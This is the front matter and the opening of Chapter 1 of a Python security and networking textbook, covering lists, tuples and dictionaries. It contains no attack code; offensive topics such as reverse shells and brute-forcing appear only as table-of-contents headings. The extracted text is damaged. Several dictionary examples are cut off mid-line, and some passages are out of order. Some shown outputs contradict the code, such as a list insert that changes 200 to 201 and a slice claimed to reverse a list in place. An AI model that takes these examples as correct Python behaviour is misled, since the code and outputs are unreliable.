
Python for Security and
Networking
Third Edition
Leverage Python modules and tools in
securing your network and applications
José Manuel Ortega
BIRMINGHAM—MUMBAI
“Python” and the Python Logo are trademarks of the Python
Software Foundation.

Python for Security and Networking
Third Edition
Copyright © 2023 Packt Publishing
All rights reserved. No part of this book may be reproduced, stored in
a retrieval system, or transmiĴed in any form or by any means,
without the prior wriĴen permission of the publisher, except in the
case of brief quotations embedded in critical articles or reviews.
Every eﬀort has been made in the preparation of this book to ensure
the accuracy of the information presented. However, the information
contained in this book is sold without warranty, either express or
implied. Neither the author, nor Packt Publishing or its dealers and
distributors, will be held liable for any damages caused or alleged to
have been caused directly or indirectly by this book.
Packt Publishing has endeavored to provide trademark information
about all of the companies and products mentioned in this book by
the appropriate use of capitals. However, Packt Publishing cannot
guarantee the accuracy of this information.
Senior Publishing Product Manager: Aaron Tanna
Acquisition Editor – Peer Reviews: Gaurav Gavas
Project Editor: Namrata Katare
Content Development Editor: Liam Thomas Draper
Copy Editor: Saﬁs Editing

Technical Editor: Aniket SheĴy
Proofreader: Saﬁs Editing
Indexer: Rekha Nair
Presentation Designer: Rajesh Shirsath
Developer Relations Marketing Executive: Meghal Patel
First published: September 2018
Second edition: December 2020
Third edition: June 2023
Production reference: 1310523
Published by Packt Publishing Ltd.
Livery Place
35 Livery Street
Birmingham
B3 2PB, UK.
ISBN 978-1-83763-755-3
www.packt.com

Contributors
About the author
José Manuel Ortega is a software engineer with focus on new
technologies, open source, security, and testing. His career target
from the beginning has been to specialize in Python and security
testing projects.
He has worked as a security tester engineer and his functions have
been analyzing and testing the security of applications, both in web
and mobile environments. In recent years, he has developed an
interest in security development, especially in pentesting with
Python.
He has collaborated with universities and other institutions,
presenting articles and holding conferences. He has also been a
speaker at various conferences, both nationally and internationally,
and is very enthusiastic to learn about new technologies and loves to
share his knowledge with the developer community.
I would like to thank my family and friends for their support in
writing this book, the publisher for giving me the opportunity to
write a new edition of this book, and the people involved in its
revision.

About the reviewer
Christian GhiglioĴy is an experienced technologist with over eight
and half years of experience across multiple disciplines within
information security, serving as both a practitioner and a leader. He
was part of the inﬂuential security program at Etsy, and helped
build the security organization at Compass, a tech-enabled real
estate brokerage. He is currently building the security architecture
and engineering functions at the New York-based tech company
Justworks.

Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

Contents
Preface
Who this book is for
What this book covers
To get the most out of this book
Get in touch
Section 1: Python Environment and System Programming Tools
1. Working with Python Scripting
Technical requirements
Learn about data structures and collections in Python
Python lists
Adding elements to a list
Reversing a list
Searching elements in a list
Python tuples
Python dictionaries
Remove an item from a dictionary in Python
Working with functions, classes, and objects in Python
Python functions
Python classes
Python inheritance
Advantages of Python inheritance
Working with files in Python
Reading and writing files in Python
Learn and understand exceptions management in Python
Python modules and packages
What is a module in Python?
How to import modules in Python
Getting information from modules
Difference between a Python module and a Python package
Managing parameters in Python
Managing parameters with OptionParser
Managing dependencies and virtual environments
Managing dependencies in a Python project
Install Python modules

Generating the requirements.txt file
Working with virtual environments
Configuring virtualenv
Development environments for Python scripting
Setting up a development environment
Debugging with Python IDLE
PyCharm
Debugging with PyCharm
Summary
Questions
Further reading
2. System Programming Packages
Technical requirements
Interact with the operating system in Python
Working with the filesystem in Python
Working with files and directories
Reading a ZIP file using Python
Executing commands with the subprocess module
Setting up a virtualenv with subprocess
Managing threads in Python
Creating a simple thread
Working with the threading module
Multiprocessing in Python
Multithreading and concurrency in Python
Multithreading in Python
Concurrency in Python with ThreadPoolExecutor
Executing ThreadPoolExecutor with a context manager
Summary
Questions
Further reading
Section 2: Network Scripting and Packet Sniffing with Python
3. Socket Programming
Technical requirements
Understanding the socket package for network requests
Network sockets in Python
The socket module
Server and client socket methods

Gathering information with sockets
Managing socket exceptions
Basic client with the socket module
Port scanning with sockets
Implementing a port scanner
Advanced port scanner
Implementing a reverse shell with sockets
Implementing a simple TCP client and TCP server
Implementing a server and client with sockets
Implementing the TCP server
Implementing the TCP client
Implementing a simple UDP client and UDP server
Implementing the UDP server
Implementing the UDP client
Implementing an HTTP server in Python
Testing the HTTP server
Sending files via sockets
Implementing secure sockets with the TLS and SSL modules
Summary
Questions
Further reading
4. HTTP Programming and Web Authentication
Technical requirements
Building an HTTP client with urllib.request
Introducing the HTTP protocol
Introducing the urllib module
Get request and response headers
Extracting emails from a URL with urllib.request
Downloading files with urllib.request
Handling exceptions with urllib.request
Building an HTTP client with requests
Getting images and links from a URL with requests
Making requests with the REST API
Managing a proxy with requests
Managing exceptions with requests
Authentication mechanisms with Python
HTTP basic authentication with the requests module

HTTP digest authentication with the requests module
Implementing OAuth clients in Python with the requests-oauthlib
module
OAuth roles
OAuth workflow
Implementing a client with requests_oauthlib
Implementing JSON Web Tokens (JWTs) in Python
How does a JSON Web Token work?
Working with PyJWT
Summary
Questions
Further reading
5. Analyzing Network Traffic and Packet Sniffing
Technical requirements
Capturing and injecting packets with pcapy-ng
Capturing packets with pcapy-ng
Reading headers from packets
Reading pcap files with pcapy-ng
Capturing and injecting packets with scapy
Introduction to scapy
Scapy commands
Sending packets with scapy
Network discovery with scapy
Port scanning and traceroute with scapy
Port scanning with scapy
Traceroute with scapy
Reading pcap files with scapy
Read DHCP requests
Writing a pcap file
Packet-sniffing with scapy
Network forensics with scapy
Working with scapy to detect ARP spoofing attacks
Detection of false ARP attacks using Scapy
Summary
Questions
Further reading
Section 3: Server Scripting and Port Scanning with Python

6. Gathering Information from Servers with OSINT Tools
Technical requirements
Introducing Open Source Intelligence (OSINT)
Google Dorks and the Google Hacking Database
Maltego
Photon
The Harvester
Censys
crt.sh
DnsDumpster
WaybackMachine
OSINT framework
Blackbird
The Shodan search engine
The BinaryEdge search engine
Getting information using Google Dorks
Google Dorks
Katana: a Python Tool for Google Hacking
Dorks hunter
Getting information using SpiderFoot
SpiderFoot modules
Getting information on DNS servers with DNSPython and
DNSRecon
The DNS protocol
The DNSPython module
DNSRecon
Getting vulnerable addresses in servers with fuzzing
The fuzzing process
Web fuzzing
Understanding and using the FuzzDB project
Identifying predictable login pages with the FuzzDB
project
Discovering SQL injection with the FuzzDB project
Wfuzz
Summary
Questions
Further reading

7. Interacting with FTP, SFTP, and SSH Servers
Technical requirements
Connecting to FTP servers
FTP protocol
Using the Python ftplib module
Transferring files with FTP
Other ftplib functions
Using ftplib to brute-force FTP user credentials
Building an anonymous FTP scanner with Python
Connecting with SSH servers with paramiko and pysftp
Executing an SSH server on Debian Linux
Introducing the paramiko module
Establishing an SSH connection with paramiko
Using AutoAddPolicy
Running commands with paramiko
Using paramiko to brute-force SSH user credentials
Establishing an SSH connection with pysftp
Implementing an SSH server with paramiko
Checking the security of SSH servers
Installing and executing ssh-audit
Rebex SSH Check
Summary
Questions
Further reading
8. Working with Nmap Scanner
Technical requirements
Introducing port scanning with Nmap
Scanning types with nmap
Port scanning with python-nmap
Extracting information with nmap
Synchronous and asynchronous scanning with python-nmap
Implementing synchronous scanning
Implementing asynchronous scanning
Discovering services and vulnerabilities with Nmap scripts
Executing Nmap scripts to discover services
Executing Nmap scripts to discover vulnerabilities
Detecting vulnerabilities with Nmap-vulners script

Detecting vulnerabilities with the Nmap-vulscan script
Port scanning via online services
Scanless port scanner
Summary
Questions
Further reading
Section 4: Server Vulnerabilities and Security in Web Applications
9. Interacting with Vulnerability Scanners
Technical requirements
Introducing the OpenVAS vulnerability scanner
Installing the OpenVAS vulnerability scanner
Understanding the web interface
Scanning a target using OpenVAS
Creating the target
Creating the task
Analyzing reports
Vulnerabilities databases
Accessing OpenVAS with Python
Introducing OWASP ZAP as an automated security testing tool
Using OWASP ZAP
Interacting with OWASP ZAP using Python
WriteHat as a pentesting reports tool
Summary
Questions
Further reading
10. Interacting with Server Vulnerabilities in Web Applications
Technical requirements
Understanding vulnerabilities in web applications with OWASP
Testing Cross-Site Scripting (XSS) vulnerabilities
Analyzing and discovering vulnerabilities in CMS web
applications
Using CMSmap
Vulnx as a CMS scanner
Discovering vulnerabilities in Tomcat server applications
Installing the Tomcat server
Testing the Tomcat server with ApacheTomcatScanner

Finding vulnerable Tomcat servers in the Censys search
engine
Scanning vulnerabilities with the Nmap port scanner
Discovering SQL vulnerabilities with Python tools
Introduction to SQL injection
Identifying websites vulnerable to SQL injection
Introducing sqlmap
Using sqlmap to test a website for a SQL injection
vulnerability
Scanning for SQL injection vulnerabilities with sqlifinder
Scanning for SQL injection vulnerabilities with the Nmap
port scanner
Automating the process of detecting vulnerabilities in web
applications
Detecting an open redirect vulnerability
Detecting vulnerabilities with Fuxploider
Summary
Questions
Further reading
11. Obtain Information from Vulnerabilities Databases
Technical requirements
Identify and understand vulnerabilities and exploits
What is an exploit?
Vulnerability formats
Searching for vulnerabilities in the NVD
Introducing NIST’s NVD
Searching for vulnerabilities
Searching for vulnerabilities in the Vulners database
Searching for vulnerabilities with Pompem
Summary
Questions
Further reading
Section 5: Python Forensics
12. Extracting Geolocation and Metadata from Documents, Images, and
Browsers
Technical requirements
Extracting geolocation information

Python modules for extracting geolocation information
Extracting metadata from images
Introduction to EXIF and the PIL module
Getting the EXIF data from an image
Extracting metadata from PDF documents
Extracting metadata with PyPDF2
Extracting metadata with PyMuPDF
Identifying the technology used by a website
Wappalyzer
WebApp Information Gatherer (WIG)
Extracting metadata from web browsers
Firefox forensics with Python
Chrome forensics with Python
Chrome forensics with Hindsight
Summary
Questions
Further reading
13. Python Tools for Brute-Force Attacks
Technical requirements
Dictionary builders for brute-force attacks
Brute-force dictionary generation with pydictor
Password list generator
Tools for brute-force attacks in Python
Obtaining subdomains by brute force
Brute-force attacks with BruteSpray
Brute-force attacks with Cerbrutus
Executing brute-force attacks for web applications
Executing a WordPress site
Executing brute-force attacks for ZIP files
Handling ZIP files in Python
Executing brute-force attacks for password-protected ZIP
files
Summary
Questions
Further reading
14. Cryptography and Code Obfuscation
Technical requirements

Introduction to cryptography
Encrypting and decrypting information with pycryptodome
Introduction to pycryptodome
Encrypting and decrypting with the DES algorithm
Encrypting and decrypting with the AES algorithm
Generating RSA signatures using pycryptodome
Encrypting and decrypting information with cryptography
Introduction to the cryptography module
Symmetric encryption with the fernet package
Symmetric encryption with the ciphers package
Generating keys securely with the secrets and hashlib modules
Generating keys securely with the secrets module
Generating keys securely with the hashlib module
Checking the integrity of a file
Python tools for code obfuscation
Code obfuscation with pyarmor
Summary
Questions
Further reading
Assessments – Answers to the End-of-Chapter Questions
Other Books You May Enjoy
Index

Preface
Recently, Python has started to gain a lot of traction, with the latest
updates adding numerous packages that can be used to perform
critical missions. Our main goal with this book is to provide a
complete coverage of the techniques and tools for networking and
security in Python. With this book, you will be able to make the most
of the Python programming language to test the security of your
network and applications.
This book will start by walking you through the scripts and libraries
of Python that are related to networking and security. You will then
dive deep into core networking tasks and learn how to handle
networking challenges. Further on, this book will teach you how to
write security scripts to detect vulnerabilities in networks and
websites. By the end of this book, you will have learned how to
achieve endpoint protection by leveraging Python packages, along
with how to extract metadata from documents and how to write
forensics and cryptography scripts.

Who this book is for
This book is ideal for network engineers, system administrators, or
any security professional looking to tackle networking and security
challenges. Security researchers and developers with some prior
experience in Python would make the most of this book. Some basic
understanding of general programming structures and Python is
necessary.

What this book covers
Chapter 1, Working with Python Scripting, introduces you to the
Python language, object-oriented programming, data structures,
exceptions, managing dependencies for developing with Python,
and development environments.
Chapter 2, System Programming Packages, teaches you about the main
Python modules for system programming, looking at topics
including reading and writing ﬁles, threads, sockets, multithreading,
and concurrency.
Chapter 3, Socket Programming, gives you some basics on Python
networking using the socket module. The socket module exposes
all of the necessary pieces to quickly write TCP and UDP clients, as
well as servers for writing low-level network applications.
Chapter 4, HTTP Programming and Web Authentication, covers the
HTTP protocol and the main Python modules, such as the urllib
standard library and requests module to retrieve and manipulate
web content. We also cover HTTP authentication mechanisms and
how we can manage them with the requests module. Finally, we
cover how to implement OAuth clients and JWT for token
generation in web applications.
Chapter 5, Analyzing Network Traﬃc and Packet Sniﬃng, covers the use
of Python to analyze network traﬃc using the pcapy and scapy
modules. These modules provide the ability to write small Python
scripts that can investigate network traﬃc.

Chapter 6, Gathering Information from Servers with OSINT Tools, covers
the main tools we can ﬁnd in the Python ecosystem for extracting
information from publicly-exposed servers using Open Source
Intelligence (OSINT) tools. We will review tools such as Google
Dorks, SpiderFoot, DnsRecon, DnsPython, and other tools for
applying fuzzing processes with Python.
Chapter 7, Interacting with FTP, SFTP, and SSH Servers, details the
Python modules that allow us to interact with FTP, SFTP, and SSH
servers, checking the security in SSH servers with the ssh-audit tool.
Also, we will learn how to implement a brute-force tool for
connecting with SSH servers.
Chapter 8, Working with Nmap Scanner, introduces Nmap as a port
scanner and covers how to implement network scanning with
Python and Nmap to gather information on a network, a speciﬁc
host, and the services that are running on that host. Also, we cover
how to ﬁnd possible vulnerabilities in a given network with Nmap
scripts.
Chapter 9, Interacting with Vulnerability Scanners, covers OpenVAS
and OWASP ZAP as vulnerability scanners and gives you reporting
tools for the main vulnerabilities we can ﬁnd in servers and web
applications. Also, we cover how to use them programmatically
from Python with the python-gmv and owasp-zap modules.
Finally, we cover how to write a vulnerability report with the
WriteHat tool.
Chapter 10, Interacting with Server Vulnerabilities in Web Applications,
covers the main vulnerabilities in web applications and the tools we
can ﬁnd in the Python ecosystem to discover vulnerabilities in CMS

web applications and sqlmap for detecting SQL vulnerabilities.
Regarding server vulnerabilities we cover in detail how to detect
vulnerabilities in Tomcat servers.
Chapter 11, Obtain Information from Vulnerabilities Database, covers
how to get information about vulnerabilities from CVE, NVD, and
vulners databases.
Chapter 12, Extracting Geolocation and Metadata from Documents,
Images, and Browsers, covers, main modules we have in Python for
extracting information about the geolocation of IP addresses,
extracting metadata from images and PDF documents, and
identifying the web technologies used by a website. Also, we cover
how to extract metadata from the Chrome and Firefox browsers and
information related to downloads, cookies, and history data stored
in SQLite databases.
Chapter 13, Python Tools for Brute-Force AĴacks, covers the main
dictionary-builder tools we have in the Python ecosystem for brute-
force aĴacks. We cover the process of executing brute-force aĴacks
and the tools for executing these aĴacks against web applications
and password-protected ZIP ﬁles.
Chapter 14, Cryptography and Code Obfuscation, covers the main
modules we have in Python to encrypt and decrypt information,
including pycryptome and cryptography. Also, we cover how to
generate keys securely in Python with the secrets and hashlib
modules. Finally, we cover Python tools for code obfuscation.
To get the most out of this book

You will need to install a Python distribution on your local machine,
which should have at least 4 GB of memory. Also, you will need
Python version 3.10, which you can install on your system globally
or use a virtual environment for testing the scripts with this version.
 
            
Software/hardware covered in 
the book
 
          
 
            
OS requirements
 
          
 
            
Python 3.10
 
          
 
            
Windows, macOS, and Linux 
(Any)
 
          
Download the example code files
The code bundle for the book is hosted on GitHub at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking. We also have other code bundles from our rich
catalog of books and videos available at
https://github.com/PacktPublishing/. Check them out!

Code in Action
Code in Action videos for this book can be viewed at
(https://packt.link/Playlist_CodeinAction).
Download the color images
We also provide a PDF ﬁle that has color images of the
screenshots/diagrams used in this book. You can download it here:
https://packt.link/t85UI.
Conventions used
There are a number of text conventions used throughout this book.
CodeInText: Indicates code words in text, database table names,
folder names, ﬁlenames, ﬁle extensions, pathnames, dummy URLs,
user input, and TwiĴer handles. Here is an example: “In this way,
the module can be installed either with the pip install pipreqs
command or through the GitHub code repository using the python
setup.py install command.”
A block of code is set as follows:
import my_module 
def main(): 
    my_module.test() 
if __name__ == '__main__': 
    main() 
Any command-line input or output is wriĴen as follows:

$ pip -r requirements.txt 
Bold: Indicates a new term, an important word, or words that you
see on the screen. For instance, words in menus or dialog boxes
appear in the text like this. For example: “Select System info from
the Administration panel.”
Warnings or important notes appear like this.
Tips and tricks appear like this.
Get in touch
Feedback from our readers is always welcome.
General feedback: Email feedback@packtpub.com and mention
the book’s title in the subject of your message. If you have questions
about any aspect of this book, please email us at
questions@packtpub.com.
Errata: Although we have taken every care to ensure the accuracy of
our content, mistakes do happen. If you have found a mistake in this
book, we would be grateful if you reported this to us. Please visit
http://www.packtpub.com/submit-errata, click Submit Errata,
and ﬁll in the form.
Piracy: If you come across any illegal copies of our works in any
form on the internet, we would be grateful if you would provide us

with the location address or website name. Please contact us at
copyright@packtpub.com with a link to the material.
If you are interested in becoming an author: If there is a topic that
you have expertise in and you are interested in either writing or
contributing to a book, please visit
http://authors.packtpub.com.
Share your thoughts
Once you’ve read Python for Security and Networking, Third Edition,
we’d love to hear your thoughts! Please click here to go
straight to the Amazon review page for this book and share
your feedback.
Your review is important to us and the tech community and will
help us make sure we’re delivering excellent quality content.

Download a free PDF copy of this
book
Thanks for purchasing this book!
Do you like to read on the go but are unable to carry your print
books everywhere?Is your eBook purchase not compatible with the
device of your choice?
Don’t worry, now with every Packt book you get a DRM-free PDF
version of that book at no cost.
Read anywhere, any place, on any device. Search, copy, and paste
code from your favorite technical books directly into your
application. 
The perks don’t stop there. You can get exclusive access to discounts,
newsleĴers, and great free content in your inbox daily.
Follow these simple steps to get the beneﬁts:
1. Scan the QR code or visit the link below:
https://packt.link/free-ebook/9781837637553

2. Submit your proof of purchase.
3. That’s it! We’ll send your free PDF and other beneﬁts to your
email directly.

————————— Section 1
—————————
Python Environment and System
Programming Tools
In this section, you will learn the basics of Python programming,
including the development environment and the methodology to
follow to write our scripts. Also, it is important to know the main
modules and packages for security and system programming tasks
such as reading and writing ﬁles, and using threads, sockets,
multithreading, and concurrency.
This part of the book comprises the following chapters:
Chapter 1, Working with Python Scripting
Chapter 2, System Programming Packages

1
Working with Python Scripting
Python is a simple-to-read-and-write, object-oriented programming
language. The language is perfect for security professionals because
it allows for fast test development as well as reusable objects to be
used in the future.
Throughout this chapter, we will explain data structures and
collections such as lists, dictionaries, tuples, and iterators. We will
review how to work with functions, classes, objects, ﬁles, and
exceptions management. We will also learn how to work with
modules, manage dependencies, and virtual environments. Finally,
we will review development environments for script development in
Python like Python IDLE or PyCharm.
The following topics will be covered in this chapter:
Learn about data structures and collections in Python
Working with functions, classes and objects in Python
Working with ﬁles in Python
Learn about and understand exceptions management in Python
Python modules and packages
Managing dependencies and virtual environments
Development environments for Python scripting

Technical requirements
Before you start reading this book, you should know the basics of
Python programming, including its basic syntax, variable types, data
types, tuples, lists, dictionaries, functions, strings, and methods.
We will work with Python version 3.10, available at
https://www.python.org/downloads.
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter01.
Learn about data structures and
collections in Python
In this section, we will review diﬀerent types of data structures,
including lists, tuples, and dictionaries. We will see methods and
operations for managing these data structures and practical
examples where we review the main use cases.
Python lists
Lists in Python are equivalent to structures such as dynamic vectors
in programming languages such as C and C++. We can express
literals by enclosing their elements between a pair of brackets and
separating them with commas. The ﬁrst element of a list has index 0.

Lists in Python are, used to store sets of related items of the same or
diﬀerent types. Also, a list is a mutable data structure which allows
the list content can be modiﬁed after it has been created.
To create a list in Python, simply enclose a comma-separated
sequence of elements in square brackets []. For example, creating a
list with response codes would be done as follows:
>>> responses = [200,400,403,500] 
Indexes are used to access an element of a list. An index is an integer
that indicates the position of an element in a list. The ﬁrst element of
a list always starts at index 0.
>>> responses[0] 
200 
>>> responses[1] 
400 
If an aĴempt is made to access an index that is outside the range of
the list, the interpreter will throw the IndexError exception.
Similarly, if an index that is not an integer is used, the TypeError
exception will be thrown:
>>> responses[4] 
Traceback (most recent call last): 
  File "<stdin>", line 1, in <module> 
IndexError: list index out of range 

Consider the following example: a programmer can create a list
using the append() method by adding objects, printing the objects,
and then sorting them before printing again. We describe a list of
protocols in the following example, and use the key methods of a
Python list, such as add, index, and remove:
>>> protocolList = [] 
>>> protocolList.append("FTP") 
>>> protocolList.append("SSH") 
>>> protocolList.append("SMTP") 
>>> protocolList.append("HTTP") 
>>> print(protocolList) 
['FTP','SSH','SMTP','HTTP'] 
>>> protocolList.sort() 
>>> print(protocolList) 
['FTP','HTTP','SMTP','SSH'] 
>>> type(protocolList) 
<type 'list'> 
>>> len(protocolList) 
4 
To access speciﬁc positions, we can use the index() method, and to
delete an element, we can use the remove() method:
>>> position = protocolList.index('SSH') 
>>> print("SSH position"+str(position)) 
SSH position 3 
>>> protocolList.remove("SSH") 
>>> print(protocolList) 
['FTP','HTTP','SMTP'] 

>>> count = len(protocolList) 
>>> print("Protocol elements "+str(count)) 
Protocol elements 3 
To print out the whole protocol list, use the following instructions.
This will loop through all the elements and print them:
>>> for protocol in protocolList: 
...     print(protocol) 
... 
FTP 
HTTP 
SMTP 
Lists also provide methods that help manipulate the values within
them and allow us to store more than one variable within them and
provide a beĴer way to sort object arrays in Python. These are the
techniques commonly used to manage lists:
.append(value): Appends an element at the end of the list
.count('x'): Gets the number of 'x' elements in the list
.index('x'): Returns the index of 'x' in the list
.insert('y','x'): Inserts 'x' at location 'y'
.pop(): Returns the last element and removes it from the list
.remove('x'): Removes the ﬁrst 'x' from the list
.reverse(): Reverses the elements in the list
.sort(): Sorts the list in ascending order

The indexing operator allows access to an element and is expressed
syntactically by adding its index in brackets to the list, list
[index]. You can change the value of a chosen element in the list
using the index between brackets:
protocolList [4] = 'SSH'
print("New list content: ", protocols) 
Also, you can copy the value of a speciﬁc position to another
position in the list:
protocolList [1] = protocolList [4] 
print("New list content:", protocols) 
The value inside the brackets that selects one element of the list is
called an index, while the operation of selecting an element from the
list is known as indexing.
Adding elements to a list
Lists are mutable sequences that can be modiﬁed, which means
items can be added, updated, or removed. To add one or more
elements, we can use the extend() method. Also, we can use the
insert() method to insert an element in a speciﬁc index location.
We can add elements to a list by means of the following methods:
list.append(value): This method allows an element to be
inserted at the end of the list. It takes its argument’s value and

puts it at the end of the list that owns the method. The list’s
length then increases by one.
list.extend(values): This method allows inserting many
elements at the end of the list.
list.insert(location, value): The insert() method is a
bit smarter since it can add a new element at any place in the
list, not just at the end. It takes as arguments ﬁrst the required
location of the element to be inserted and then the element to be
inserted.
In the following example we are using these methods to add
elements to the response code list.
>>> responses.append(503) 
>>> responses 
[200, 400, 403, 500, 503] 
>>> responses.extend([504,505]) 
>>> responses 
[200, 400, 403, 500, 503, 504, 505] 
>>> responses.insert(6,300) 
>>> responses 
[201, 400, 403, 500, 503, 504, 300, 505] 
Reversing a list
Another interesting operation that we perform in lists is the one that
oﬀers the possibility of geĴing elements in a reverse way in the list
through the reverse() method:

>>> protocolList.reverse() 
>>> print(protocolList) 
['SMTP','HTTP','FTP'] 
Another way to do the same operation is to use the -1 index. This
quick and easy technique shows how you can access all the elements
of a list in reverse order:
>>> protocolList[::-1] 
>>> print(protocolList) 
['SMTP','HTTP','FTP'] 
Searching elements in a list
In this example, we can see the code for ﬁnding the location of a
given element inside a list. We use the range function to get
elements inside protocolList and we compare each element with
the element to ﬁnd. When both elements are equal, we break the
loop and return the element. To ﬁnd out if an element is contained in
a list, we can use the membership operator in.
>>> 'HTTPS' in protocolList 
False 
>>> 'HTTP' in protocolList 
True 
You can ﬁnd the following code in the search_element_list.py
ﬁle:

protocolList = ["FTP", "HTTP", "SNMP", "SSH"] 
element_to_find = "SSH"
for i in range(len(protocolList)): 
    if element_to_find in protocolList[i]: 
        print("Element found at index", i) 
        break
Now that you know how to add, reverse, and search for elements in
a list, let’s move on to learning about tuples in Python.
Python tuples
Like lists, the tuple class in Python is a data structure that can store
elements of diﬀerent types.
Along with the list and range classes, it is one of the sequence
types in Python, with the particularity that they are immutable. This
means its content cannot be modiﬁed after it has been created.
In general, to create a tuple in Python, you simply deﬁne a sequence
of elements separated by commas. Indices are used to access an
element of a tuple. An index is an integer indicating the position of
an element in a tuple. The ﬁrst element of a tuple always starts at
index 0.
>>> tuple=("FTP","SSH","HTTP","SNMP") 
>>> tuple[0] 
'FTP' 

If an aĴempt is made to access an index that is outside the range of
the tuple, the interpreter will throw the IndexError exception.
Similarly, if an index that is not an integer is used, the TypeError
exception will be thrown:
>>> tuple[5] 
Traceback (most recent call last): 
  File "<input>", line 1, in <module> 
IndexError: tuple index out of range 
As with lists and all sequential types, it is permissible to use negative
indices to access the elements of a tuple. In this case, the index -1
refers to the last element of the sequence, -2 to the penultimate, and
so on:
>>> tuple[-1] 
'SNMP' 
>>> tuple[-2] 
'HTTP' 
When trying to modify a tuple, we see how we get an error since
tuples are immutable objects:
>>> tuple[0]="FTP" 
Traceback (most recent call last): 
    File "<stdin>", line 1, in <module> 
TypeError: 'tuple' object does not support item assi

Now that you know the basic data structures for working with
Python, let’s move on to learning about Python dictionaries in order
to organize information in the key-value format.
Python dictionaries
The Python dictionary data structure is probably the most important
in the entire language and allows us to associate values with keys.
Python’s dict class is a map type that maps keys to values. Unlike
sequential types (list, tuple, range, or str), which are indexed by a
numeric index, dictionaries are indexed by keys. Among the main
features of the dictionaries, we can highlight:
It is a mutable type, that is, its content can be modiﬁed after it
has been created.
It is a type that reserves the order in which key-value pairs are
inserted.
In Python there are several ways to create a dictionary. The simplest
is to enclose a sequence of comma-separated key:value pairs in curly
braces {}. In this example we will deﬁne the service name as the key
and the port number as the value.
Another way to create a dictionary is using the dict class:
>>> dict(services) 
{'FTP': 21, 'SSH': 22, 'SMTP': 25, 'HTTP': 80} 
>>> services = {"FTP":21, "SSH":22, "SMTP":25, "HTTP

>>> type(services) 
<class 'dict'> 
Accessing an element of a dictionary is one of the main operations
for which this type of data exists. Access to a value is done by
indexing the key. To do this, simply enclose the key in square
brackets. If the key does not exist, the KeyError exception will be
thrown.
>>> services['FTP'] 
21 
The dict class also oﬀers the get (key[, default value])
method. This method returns the value corresponding to the key
used as the ﬁrst parameter. If the key does not exist, it does not
throw any errors, but returns the second argument by default. If this
argument is not supplied, the value None is returned.
>>> services.get('SSH') 
22 
If the key does not exist, it does not throw any errors, but returns the
second argument by default.
>>> services.get('gopher', "service not found") 
'service not found' 
If this argument is not supplied, the value None is returned.

>>> type(services.get('gopher')) 
<class 'NoneType'> 
Using the update method, we can combine two distinct dictionaries
into one. In addition, the update method will merge existing
elements if they conﬂict:
The ﬁrst value is the key, and the second the key value. We can use
any unchangeable value as a key. We can use numbers, sequences,
Booleans, or tuples, but not lists or dictionaries, since they are
mutable.
The main diﬀerence between dictionaries and lists or tuples is that
values contained in a dictionary are accessed by their name and not
by their index. You may also use this operator to reassign values, as
in the lists and tuples:
>>> services = {"FTP":21, "SSH":22, "SMTP":25, "HTTP
>>> services2 = {"FTP":21, "SSH":22, "SMTP":25, "LDA
>>> services.update(services2) 
>>> services 
{'FTP': 21, 'SSH': 22, 'SMTP': 25, 'HTTP': 80, 'LDAP
>>> services["HTTP"] = 8080
>>> services 
{'FTP': 21, 'SSH': 22, 'SMTP': 25, 'HTTP': 8080, 'LD

This means that a dictionary is a set of key-value pairs with the
following conditions:
Each key must be unique: That means it is not possible to have
more than one key of the same value.
A key may be a number or a string.
A dictionary is not a list: A list contains a set of numbered
values, while a dictionary holds pairs of values.
The len() function: This works for dictionaries and returns the
number of key-value elements in the dictionary.
IMPORTANT NOTE
In Python 3.10, dictionaries have become ordered
collections by default.
The dict class implements three methods, since they return an
iterable data type, known as view objects. These objects provide a
view of the keys and values of type dict_values contained in the
dictionary, and if the dictionary changes, these objects are instantly
updated. The methods are as follows:
items(): Returns a view of (key, value) pairs from the
dictionary.
keys(): Returns a view of the keys in the dictionary.
values(): Returns a view of the values in the dictionary.
>>> services.items() 
dict_items([('FTP', 21), ('SSH', 22), ('SMTP', 25), 
>>> services.keys() 

You might want to iterate over a dictionary and extract and display
all the key-value pairs with a for loop:
>>> for key,value in services.items(): 
...     print(key,value) 
...  
FTP 21 
SSH 22 
SMTP 25 
HTTP 8080 
LDAP 389 
The dict class is mutable, so elements can be added, modiﬁed,
and/or removed after an object of this type has been created. To add
a new item to an existing dictionary, use the assignment operator =.
To the left of the operator appears the dictionary object with the new
key in square brackets [] and to the right the value associated with
said key.
dict_keys(['FTP', 'SSH', 'SMTP', 'HTTP', 'LDAP']) 
>>> services.values() 
dict_values([21, 22, 25, 8080, 389]) 
>>> services['HTTPS'] = 443
>>> services 
{'FTP': 21, 'SSH': 22, 'SMTP': 25, 'HTTP': 8080, 'LD

Now that you know the main data structures for working with
Python, let’s move on to learning how to structure our Python code
with functions and classes.
Remove an item from a dictionary in
Python
In Python there are several ways to remove an element from a
dictionary. They are the following:
pop(key [, default value]): If the key is in the dictionary,
it removes the element and return its value; if not, it returns the
default value. If the default value is not provided and the key is
not in the dictionary, the KeyError exception is raised.
popitem(): Removes the last key:value pair from the dictionary
and returns it. If the dictionary is empty, the KeyError
exception is raised.
del d[key]: Deletes the key:value pair. If the key does not
exist, the KeyError exception is thrown.
clear(): Clears all key:value pairs from the dictionary.
In the following instructions we are removing the elements of the
services dictionary using the previous methods:
>>> services = {'FTP': 21, 'SSH': 22, 'SMTP': 25, 'H
>>> services.pop('HTTPS') 
443 
>>> services 
{'FTP': 21, 'SSH': 22, 'SMTP': 25, 'HTTP': 8080, 'LD

Working with functions, classes,
and objects in Python
In this section, we will review Python functions, classes, and objects
in Python scripts. We will review some examples for declaring and
using in our script code.
Python functions
A function is a block of code that performs a speciﬁc task when the
function is invoked. You can use functions to make your code
reusable, beĴer organized, and more readable. Functions can have
parameters and return values. There are at least four basic types of
functions in Python:
Built-in functions: These are an integral part of Python. You can
see a complete list of Python’s built-in functions at
https://docs.python.org/3/library/functions.html.
>>> services.popitem() 
('LDAP', 389) 
>>> services 
{'FTP': 21, 'SSH': 22, 'SMTP': 25, 'HTTP': 8080} 
>>> del services['HTTP'] 
>>> services 
{'FTP': 21, 'SSH': 22, 'SMTP': 25} 
>>> services.clear() 
>>> services 
{} 

Functions that come from pre-installed modules.
User-deﬁned functions: These are wriĴen by developers in their
own code, and they use them freely in Python.
The lambda function: This allows us to create anonymous
functions that are built using expressions such as product =
